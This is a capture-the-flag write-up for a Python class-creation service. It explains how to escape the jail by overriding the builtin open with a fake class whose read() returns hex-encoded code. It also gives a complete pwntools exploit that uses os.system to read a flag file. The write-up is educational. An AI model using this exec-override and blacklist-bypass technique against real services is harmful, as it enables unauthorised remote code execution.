# ez-class (misc, 375 points, 17 solves)

>This one is pretty ez
```shell
nc ezclass.bctf23-codelab.kctf.cloud 1337
```

This challenge was my favorite. Thanks to the organizers for this wonderful CTF!

## Overview
This challenge is about a service that gives us the possibility to create and run classes.
We can specify:
- The class name
- The parent class
- The mumber of methods
- The method names
- The method params
- The method bodies

There is no blacklist except for this little one here: `().\n`
We can run a class and also its dependencies. After executing the class, the service returns us an instance of the specified class.

## The first idea
How are we going to execute code if the only thing that gets done is loading the class and instantiating the object?

The first idea that came to my mind is to do some ✨**magic**✨ using [magic functions](https://www.tutorialsteacher.com/python/magic-methods-in-python).
There are so many! But a useful one is [`__new__`](https://www.pythontutorial.net/python-oop/python-__new__/):

>When you create an instance of a class, Python first calls the `__new__()` method to create the object and then calls the `__init__()` method to initialize the object’s attributes.

Using `__new__`, we can return some values and we can execute code, but we can't call functions yet.

Let's take a look at how the classes are loaded:
```python
def exec_class(filename, dependancies, class_name):
    for dep in dependancies:
        with open('/tmp/' + dep, 'r') as f:
            exec(f.read())

    with open('/tmp/' + filename, 'r') as f:
        exec(f.read())

    print('Here is an instance of your class')
    print(locals()[class_name]())
```

If we're able to override `read()` we can get RCE.

## It's time to get out of the pyjail!
We need to:
- Override the `open` function with a class
- Override the `read` with our custom method which needs to return the code to print the flag
- Profit

The class will look like this:
```python
class open(object):
    def __init__(filename,*args):
        pass

    def __enter__(self):
        return self

    def __exit__(*args):
        pass

    def read(self):
        global open;open=self;return "\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29"
```

We also need to add `__enter__` and `__exit__` because they're automatically called by the `with` operator.
Inside the `read` method, we override the `open` function with our instance of the class `self` and then, we return the code to print the flag.

Now we can create this class inside the service and then run it.
The service will also ask us to specify the dependencies of the class to be executed, we put the class created before.

So the service will behave like this:
Here, we override the open function with our class:

```python
for dep in dependancies:
    with open('/tmp/' + dep, 'r') as f:
        exec(f.read())
```

Now that we've overridden the open function, the code passed above to print the flag will be executed here:
```python
with open('/tmp/' + filename, 'r') as f:
    exec(f.read())
```

The service will then crash at this instruction, but we don't care😈:
```python
print(locals()[class_name]())
```

## The exploit

```python
from pwn import remote

def create_class(p, classname, parent, functions):
    print(f"Creating class {classname}")
    p.sendline(b"1")
    p.sendline(classname.encode())
    p.sendline(parent.encode())
    p.sendline(f"{len(functions)}".encode())
    for function in functions:
        p.sendline(function["name"].encode())
        p.sendline(function["params"].encode())
        p.sendline(function["body"].encode())
    print("Done!")


def run_class(p, torun, dep):
    print(f"Running class {torun}")
    p.sendline(b"2")
    p.sendline(torun.encode())
    p.sendline(dep.encode())
    print("Done!")

def bypass_char_blacklist(code):
    result = ""
    for char in code:
        result += "\\x" + hex(ord(char))[2:].zfill(2)
    return result

clean_code = """
import os
os.system('cat /tmp/flag.txt')
"""

to_exec = bypass_char_blacklist(clean_code)

r = remote("ezclass.bctf23-codelab.kctf.cloud", 1337)

fake_open_classname = "open"
fake_open_parent = "object"
fake_open_functions = [
    {"name": "__init__", "params": "filename,*args", "body": "pass"},
    {"name": "__enter__", "params": "self", "body": "return self"},
    {"name": "__exit__", "params": "*args", "body": "pass"},
    {"name": "read", "params": "self", "body": f"global open;open=self;return \"{to_exec}\""}
]

create_class(r, fake_open_classname, fake_open_parent, fake_open_functions)
run_class(r, fake_open_classname, fake_open_classname)

r.interactive()
```

### Output:
**EZ!**

![EZ!](https://i.imgur.com/2BC2X35.png)

